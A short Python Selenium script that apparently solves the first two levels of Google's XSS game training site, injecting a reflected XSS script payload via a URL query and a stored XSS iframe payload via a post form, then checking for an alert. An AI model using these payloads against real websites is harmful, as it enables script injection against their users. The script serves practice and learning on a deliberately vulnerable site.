from selenium import webdriver
from selenium.webdriver.common.by import By
import time
def check_xss(uri):
    #check level one of the xss game
    #create the driver and enter the xss URI
    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    driver = webdriver.Chrome(options=options)
    driver.get(uri)
    time.sleep(5)
    #try to switch to the alert box and check for our test text
    try:
        alert = driver.switch_to.alert
        if 'xss detected' in alert.text:
            return True
        else:
            return False
    except Exception as e:
        return False

def check_stored_xss(uri):
    #check level two of the xss game
    #create the driver and get the URI
    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    driver = webdriver.Chrome(options=options)
    driver.get(uri)
    time.sleep(2)
    #enter the input into the post-content field
    input = driver.find_element(By.ID, "post-content")
    input.send_keys("test <iframe src=\"javascript:alert(`xss detected`)\">")
    time.sleep(2)
    #click the submit button
    button = driver.find_element(By.CLASS_NAME, "share")
    button.click()
    time.sleep(2)
    #try to switch to the alert box and check for our test text
    try:
        alert = driver.switch_to.alert
        if 'xss detected' in alert.text:
            return True
        else:
            return False
    except Exception as e:
        return False


uri1 = "https://xss-game.appspot.com/level1/frame?query=<script>+alert('xss detected')</script>"
print(f'Site is vulnerable to reflected XSS (level 1): {check_xss(uri1)}')
uri2 = "https://xss-game.appspot.com/level2/frame"
print(f'Site is vulnerable to stored XSS (level2): {check_stored_xss(uri2)}')